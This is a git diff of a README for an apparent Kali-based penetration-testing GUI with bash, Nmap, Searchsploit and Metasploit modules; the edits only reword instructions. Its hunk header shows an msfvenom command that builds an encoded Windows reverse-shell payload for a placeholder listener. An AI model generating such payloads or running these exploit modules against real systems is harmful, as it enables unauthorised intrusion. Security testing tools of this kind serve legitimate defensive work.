@@ -27,7 +27,7 @@ msfvenom -p windows/shell_reverse_tcp -a x86 -e x86/shikata_ga_nai LHOST=<Your L
 
 
 ### Linux Bash Module:<br>
-Type the IP address of kali and type your bash command on it, than you can execute.<br>
+Input the IP address of kali and input your bash command on it, than you can execute.<br>
 If you know how to use the ssh, then you should be know how to use this modulel.<br>
 
 Example Command:
@@ -36,16 +36,16 @@ ifconfig
 ```
 
 ### Nmap Module:<br>
-Type the IP address of kali and target and setup the option then you can execute.<br>
+Input the IP address of kali and target and setup the option then you can execute.<br>
 Scan report will below the console.<br>
 
 
 ### Searchsploit Module:<br>
-Type the vulnerabilities number or CMS/Service name and version.<br>
+Input the vulnerabilities number or CMS/Service name and version.<br>
 If the input CMS/Service is vulnerable, than it will show the exploit.<br>
 
 ### Metasploit Module:<br>
-Type the RHost LHost to input box and select a exploit module, then you can exploit.<br>
+Input the RHost LHost to input box and select a exploit module, then you can exploit.<br>
 For security reason, if metasploit successful remote code execution, the target will be shutdown in 3 second.<br>
 **The Target is not 100% can be exploit**
 
